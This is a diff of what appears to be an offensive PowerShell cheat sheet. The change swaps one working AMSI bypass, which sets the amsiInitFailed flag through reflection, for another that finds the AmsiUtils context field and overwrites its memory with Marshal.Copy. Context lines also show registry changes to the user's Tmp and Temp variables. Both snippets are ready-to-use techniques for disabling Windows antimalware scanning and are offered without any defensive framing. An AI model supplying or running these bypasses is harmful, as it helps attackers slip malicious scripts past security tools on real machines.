@@ -15,12 +15,16 @@ Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
 Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp
 ~~~
 
-##### Powershell Obfuscated AMSI Bypass:
+##### AMSI Bypass:
 ~~~
-$w='System.Management.Automation.A';$c='si';$m='Utils'
-$assembly=[Ref].Assembly.GetType(('{0}m{1}{2}'-f$w,$c,$m))
-$field=$assembly.GetField(('am{0}InitFailed'-f$c),'NonPublic,Static')
-$field.SetValue($null,$true)
+$a = [Ref].Assembly.GetTypes()
+ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b}}
+$d = $c.GetFields('NonPublic,Static')
+ForEach($e in $d) {if ($e.Name -like "*Context") {$f = $e}}
+$g = $f.GetValue($null)
+[IntPtr]$ptr = $g
+[Int32[]]$buf = @(0)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 ~~~
 
 ##### Powershell Modified AMSI .Net Bypass script - In Memory
